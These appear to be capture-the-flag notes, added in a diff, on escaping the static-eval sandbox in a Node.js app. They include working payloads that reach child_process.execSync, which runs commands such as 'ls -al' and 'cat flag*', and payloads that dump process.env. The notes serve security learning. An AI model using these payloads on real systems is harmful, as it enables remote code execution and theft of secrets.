@@ -1,0 +1,16 @@
+- Takeaways:
+	- pay attention to error messages being returned from the app, might be possible to use them to exfiltrate data rather than using blind methods
+	- check GitHub commits for open source projects in order to find security fixes and other changes that could lead to compromise in different versions of libraries
+	- escaping multiple layers of nested quotes (single, double, backtick) can be tricky, helps to try multiple slashes for each depending on context
+- provided with the source code for a Node.js application
+- after looking around, it becomes clear that the app takes in a JSON object by POST request and assigns the body to a `student` variable
+- the `formula` field of the `student` object is then parsed into an AST using `esprima` before being evaluated using the `static-eval`	NPM package
+- the app is using the `2.0.2` version of `static-eval` which had some of the easier to find vulnerabilities already fixed
+- additional searching leads to a vulnerability that allows you to escape the `static-eval`	sandbox by using template literals
+	- ```(function(x){return `${eval('console.log(process.env)')}` })()```
+	- ```(function(x){return `${eval('global.process.mainModule.constructor._load("child_process").execSync("ls -al").toString()')}` })()```
+	- https://nvd.nist.gov/vuln/detail/CVE-2021-23334#vulnCurrentDescriptionTitle
+- searching after the fact leads to other vulnerabilities that were patched and had specific tests added in GitHub that could have been used to get code execution outside of the sandbox
+	- `(function myTag(y){return ""[!y?"__proto__":"constructor"][y]})("constructor")("console.log(process.env)")()`
+	- `(function (y){return ''[y?y:'length'][y]})('constructor')('throw new TypeError(process.mainModule.require(\"child_process\").execSync(\"cat flag*\").toString())')()`
+	- https://hilb3r7.github.io/walkthroughs/babybreakinggrad.html 
